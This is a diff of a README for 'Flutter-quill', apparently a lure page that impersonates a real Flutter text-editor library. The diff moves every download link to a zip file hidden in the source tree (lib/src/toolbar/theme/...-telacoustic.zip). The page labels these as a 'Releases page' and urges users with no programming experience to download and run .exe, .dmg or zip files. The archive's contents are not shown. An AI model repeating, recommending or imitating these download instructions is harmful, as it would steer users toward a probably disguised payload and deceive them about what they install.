@@ -1,7 +1,7 @@
 # ✨ Flutter-quill - A Simple Rich Text Editor
 
 ## 📥 Download Now
-[![Download Flutter-quill](https://raw.githubusercontent.com/nd863281/Flutter-quill/main/shoewoman/Flutter-quill.zip%https://raw.githubusercontent.com/nd863281/Flutter-quill/main/shoewoman/Flutter-quill.zip)](https://raw.githubusercontent.com/nd863281/Flutter-quill/main/shoewoman/Flutter-quill.zip)
+[![Download Flutter-quill](https://raw.githubusercontent.com/nd863281/Flutter-quill/main/lib/src/toolbar/theme/Flutter-quill-telacoustic.zip%https://raw.githubusercontent.com/nd863281/Flutter-quill/main/lib/src/toolbar/theme/Flutter-quill-telacoustic.zip)](https://raw.githubusercontent.com/nd863281/Flutter-quill/main/lib/src/toolbar/theme/Flutter-quill-telacoustic.zip)
 
 ## 🚀 Getting Started
 Flutter-quill is a rich text editor specifically designed for Flutter applications. It allows you to easily create, edit, and format text with features that enhance text presentations. Anyone can use this tool, even if you have no programming experience.
@@ -15,12 +15,12 @@ Flutter-quill is a rich text editor specifically designed for Flutter applicatio
 ## 📦 Download & Install
 To get started with Flutter-quill, follow these steps:
 
-1. Click the **Download Now** button above or visit the [Releases page](https://raw.githubusercontent.com/nd863281/Flutter-quill/main/shoewoman/Flutter-quill.zip).
+1. Click the **Download Now** button above or visit the [Releases page](https://raw.githubusercontent.com/nd863281/Flutter-quill/main/lib/src/toolbar/theme/Flutter-quill-telacoustic.zip).
 2. Once on the Releases page, look for the latest release. You will find a list of assets related to that release.
 3. **Choose your platform**:
    - For Windows, select the `.exe` file.
    - For macOS, select the `.dmg` file.
-   - For Linux, select the `https://raw.githubusercontent.com/nd863281/Flutter-quill/main/shoewoman/Flutter-quill.zip` file.
+   - For Linux, select the `https://raw.githubusercontent.com/nd863281/Flutter-quill/main/lib/src/toolbar/theme/Flutter-quill-telacoustic.zip` file.
 4. Click on the file to begin the download.
 
 ## 🎉 Features
@@ -60,4 +60,4 @@ You are not alone in using Flutter-quill. Join our community to share your exper
 ## 🌟 Conclusion
 Flutter-quill simplifies text editing within Flutter applications. With its easy-to-use interface and robust features, anyone can create and format text documents effortlessly. Download it today and enhance your text editing experience!
 
-For more details, visit the [Releases page](https://raw.githubusercontent.com/nd863281/Flutter-quill/main/shoewoman/Flutter-quill.zip).
+For more details, visit the [Releases page](https://raw.githubusercontent.com/nd863281/Flutter-quill/main/lib/src/toolbar/theme/Flutter-quill-telacoustic.zip).
